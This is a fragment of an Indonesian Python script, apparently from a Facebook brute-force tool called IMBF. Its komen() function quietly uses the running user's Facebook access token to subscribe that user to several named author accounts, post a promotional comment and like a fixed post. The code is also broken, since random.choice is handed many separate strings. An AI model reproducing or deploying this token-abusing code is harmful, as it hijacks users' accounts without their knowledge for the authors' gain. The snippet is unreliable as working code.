...
[+]Author   : NIKI
[+]Facebook : https://www.facebook.com/profile.php?id=100000903673842
...
def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
	...
	kata = random.choice("Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman 🤪:)
        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
        kom = 'Pengguna Script IMBF '+love+'\n'+kata+'\n'+waktu
        requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) #Moch Irpan
        requests.post('https://graph.facebook.com/100000146759213/subscribers?access_token=' + toket) #IRPANSOPIAN
        requests.post('https://graph.facebook.com/100000263528306/subscribers?access_token=' + toket) #M Wildan Safaki
        requests.post('https://graph.facebook.com/100000903673842/subscribers?access_token=' + toket) #Jerysmith Jery
        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' +kom+ '&access_token=' + toket) #mochIrpan
        requests.post('https://graph.facebook.com/254018450221419/likes?summary=true&access_token=' + toket) #mochIrpan
        requests.post('https://graph.facebook.com/254018450221419/comments/?message=Ijin Pake Scripnya bang Malik❤️&access_token=' + toket) #mochIrpan
